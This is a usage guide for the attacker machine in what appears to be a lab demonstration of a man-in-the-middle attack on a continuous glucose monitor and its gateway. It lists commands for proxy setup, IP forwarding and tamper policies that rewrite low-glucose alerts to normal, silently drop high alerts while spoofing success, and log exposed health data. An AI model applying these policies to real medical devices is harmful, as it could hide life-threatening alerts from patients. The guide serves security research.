# Attacker Node Guide

Run from `threat_model_mitm/src/machine3_attacker/`.

## Configure

```bash
python3 run_attack.py \
  --set-config cgm_ip="<cgm_ip_address>" \
  --set-config gateway_ip="<gateway_ip_address>" \
  --set-config network_interface="<network_interface>"

python3 run_attack.py --show-config
```

## Run

```bash
sudo python3 run_attack.py
```

Stop with `Ctrl+C` to run cleanup.

## Manual Setup and Recovery

```bash
sudo python3 run_attack.py --setup
sudo python3 run_attack.py --cleanup
sudo python3 run_attack.py --proxy-setup
sudo python3 run_attack.py --proxy-cleanup
sudo python3 run_attack.py --ip-forwarding-enable
sudo python3 run_attack.py --ip-forwarding-disable
```

## Evidence Files

- `logs/attack_packet_map.jsonl`
- `logs/attack_summary.json`
- `logs/phi_exposure.jsonl`

Runtime evidence files are reset at the start of each normal attack run.

## Tamper Policy

Supported alert keys:

- `LOW`
- `HIGH`
- `NORMAL`

Supported actions:

- `forward_log`: record evidence and forward unchanged
- `modify`: change configured packet fields before forwarding
- `drop`: do not forward to the gateway

`logs/attack_summary.json` records the active policy as `tamper_policy_used`.
Update the policy before runtime whenever the demo scenario changes.

## Policy Presets

These presets cover the main demo cases. Use the same `--set-config` pattern
to combine `LOW`, `HIGH`, and `NORMAL` rules as needed.

Default demo tamper policy used in the final recording:

```bash
python3 run_attack.py \
  --set-config tamper_policy.LOW.enabled=true \
  --set-config tamper_policy.LOW.action="modify" \
  --set-config tamper_policy.LOW.replacement_glucose_mmol=6.8 \
  --set-config tamper_policy.LOW.replacement_alert_level="NORMAL" \
  --set-config tamper_policy.LOW.attack_event="low_alert_tampering" \
  --set-config tamper_policy.LOW.impact="time_critical_hypoglycaemia_masked" \
  --set-config tamper_policy.LOW.spoof_success_on_drop=true \
  --set-config tamper_policy.HIGH.enabled=true \
  --set-config tamper_policy.HIGH.action="drop" \
  --set-config tamper_policy.HIGH.replacement_glucose_mmol=7.4 \
  --set-config tamper_policy.HIGH.replacement_alert_level="NORMAL" \
  --set-config tamper_policy.HIGH.attack_event="high_covert_drop" \
  --set-config tamper_policy.HIGH.impact="hyperglycaemia_alert_loss" \
  --set-config tamper_policy.HIGH.spoof_success_on_drop=true \
  --set-config tamper_policy.NORMAL.enabled=true \
  --set-config tamper_policy.NORMAL.action="forward_log" \
  --set-config tamper_policy.NORMAL.replacement_glucose_mmol=12.2 \
  --set-config tamper_policy.NORMAL.replacement_alert_level="HIGH" \
  --set-config tamper_policy.NORMAL.attack_event="normal_phi_exposure" \
  --set-config tamper_policy.NORMAL.impact="plaintext_phi_disclosure"
```

Suppress LOW alerts only:

```bash
python3 run_attack.py \
  --set-config tamper_policy.LOW.enabled=true \
  --set-config tamper_policy.LOW.action=modify \
  --set-config tamper_policy.LOW.replacement_glucose_mmol=6.8 \
  --set-config tamper_policy.LOW.replacement_alert_level=NORMAL \
  --set-config tamper_policy.HIGH.enabled=false \
  --set-config tamper_policy.NORMAL.enabled=false
```

Suppress HIGH alerts only:

```bash
python3 run_attack.py \
  --set-config tamper_policy.HIGH.enabled=true \
  --set-config tamper_policy.HIGH.action=modify \
  --set-config tamper_policy.HIGH.replacement_glucose_mmol=7.4 \
  --set-config tamper_policy.HIGH.replacement_alert_level=NORMAL \
  --set-config tamper_policy.LOW.enabled=false \
  --set-config tamper_policy.NORMAL.enabled=false
```

Suppress LOW and HIGH alerts:

```bash
python3 run_attack.py \
  --set-config tamper_policy.LOW.enabled=true \
  --set-config tamper_policy.LOW.action=modify \
  --set-config tamper_policy.LOW.replacement_glucose_mmol=6.8 \
  --set-config tamper_policy.LOW.replacement_alert_level=NORMAL \
  --set-config tamper_policy.HIGH.enabled=true \
  --set-config tamper_policy.HIGH.action=modify \
  --set-config tamper_policy.HIGH.replacement_glucose_mmol=7.4 \
  --set-config tamper_policy.HIGH.replacement_alert_level=NORMAL \
  --set-config tamper_policy.NORMAL.enabled=false
```

Evidence-only forwarding:

```bash
python3 run_attack.py \
  --set-config tamper_policy.LOW.enabled=true \
  --set-config tamper_policy.LOW.action=forward_log \
  --set-config tamper_policy.HIGH.enabled=true \
  --set-config tamper_policy.HIGH.action=forward_log \
  --set-config tamper_policy.NORMAL.enabled=true \
  --set-config tamper_policy.NORMAL.action=forward_log
```

LOW covert drop:

```bash
python3 run_attack.py \
  --set-config tamper_policy.LOW.enabled=true \
  --set-config tamper_policy.LOW.action=drop \
  --set-config tamper_policy.LOW.spoof_success_on_drop=true \
  --set-config tamper_policy.HIGH.enabled=false \
  --set-config tamper_policy.NORMAL.enabled=false
```

Verify after any policy change:

```bash
python3 run_attack.py --show-config
```
